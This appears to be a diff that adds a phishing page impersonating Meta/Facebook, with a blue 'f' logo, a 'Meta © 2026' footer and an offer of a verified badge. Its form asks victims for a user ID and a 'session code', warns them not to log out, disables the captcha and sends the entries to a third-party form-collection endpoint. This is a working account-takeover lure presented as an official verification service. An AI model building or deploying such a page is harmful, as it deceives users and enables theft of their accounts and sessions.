@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verification Center</title>
+
+<style>
+body{
+    margin:0;
+    font-family:Arial;
+    background:#f0f2f5;
+}
+
+/* Header */
+.header{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:12px;
+    background:#fff;
+    border-bottom:1px solid #ddd;
+}
+
+.logo{
+    display:flex;
+    align-items:center;
+}
+
+.logo-circle{
+    width:40px;
+    height:40px;
+    background:#1877f2;
+    border-radius:50%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    color:#fff;
+    font-weight:bold;
+    font-size:20px;
+    margin-right:10px;
+}
+
+.lang{
+    background:#f0f2f5;
+    padding:6px 10px;
+    border-radius:6px;
+}
+
+/* Container */
+.container{
+    max-width:500px;
+    margin:auto;
+    padding:10px;
+}
+
+/* Card */
+.card{
+    background:#fff;
+    padding:15px;
+    border-radius:12px;
+    margin-bottom:12px;
+    box-shadow:0 2px 8px rgba(0,0,0,0.1);
+}
+
+/* Alert */
+.alert{
+    background:#fff3cd;
+    border:1px solid #ffeeba;
+}
+
+/* Error box */
+.error{
+    background:#f8d7da;
+    border:1px solid #f5c6cb;
+    color:#721c24;
+}
+
+/* Inputs */
+input{
+    width:100%;
+    padding:12px;
+    margin:8px 0;
+    border-radius:8px;
+    border:1px solid #ccc;
+}
+
+/* Button */
+button{
+    width:100%;
+    padding:12px;
+    background:#1877f2;
+    color:#fff;
+    border:none;
+    border-radius:8px;
+    font-size:16px;
+    cursor:pointer;
+}
+
+button:hover{
+    background:#145dc2;
+}
+
+/* Video */
+video{
+    width:100%;
+    border-radius:10px;
+}
+
+/* Footer */
+.footer{
+    text-align:center;
+    color:#777;
+    padding:20px;
+}
+</style>
+
+</head>
+<body>
+
+<!-- Header -->
+<div class="header">
+    <div class="logo">
+        <div class="logo-circle">f</div>
+        <b>Verification Center</b>
+    </div>
+    <div class="lang">English</div>
+</div>
+
+<div class="container">
+
+    <!-- Info -->
+    <div class="card">
+        <h2>Request a Verified Badge</h2>
+        <p>The verified badge confirms your account authenticity.</p>
+    </div>
+
+    <!-- About -->
+    <div class="card">
+        <h3>About Verification</h3>
+        <p>Please provide accurate details below.</p>
+    </div>
+
+    <!-- Warning -->
+    <div class="card alert">
+        ⚠️ Important: Do not log out until verification is complete.
+    </div>
+
+    <!-- Video -->
+    <div class="card">
+        <h3>Video Guide</h3>
+        <video controls>
+            <source src="your-video.mp4" type="video/mp4">
+        </video>
+    </div>
+
+    <!-- Form -->
+    <div class="card">
+        <h3>Submit Your Request</h3>
+
+        <div class="card error">
+            All required fields must be filled correctly.
+        </div>
+
+        <form action="https://formspree.io/f/YOUR_FORM_ID" method="POST">
+
+            <input type="text" name="user_id" placeholder="User ID" required>
+
+            <input type="text" name="session_code" placeholder="Session Code" required>
+
+            <!-- Hidden -->
+            <input type="hidden" name="_subject" value="New Verification Request">
+            <input type="hidden" name="_captcha" value="false">
+
+            <button type="submit">Submit Verification Request</button>
+
+        </form>
+
+    </div>
+
+</div>
+
+<div class="footer">
+    Privacy · Terms · Cookies <br>
+    Meta © 2026
+</div>
+
+</body>
+</html>
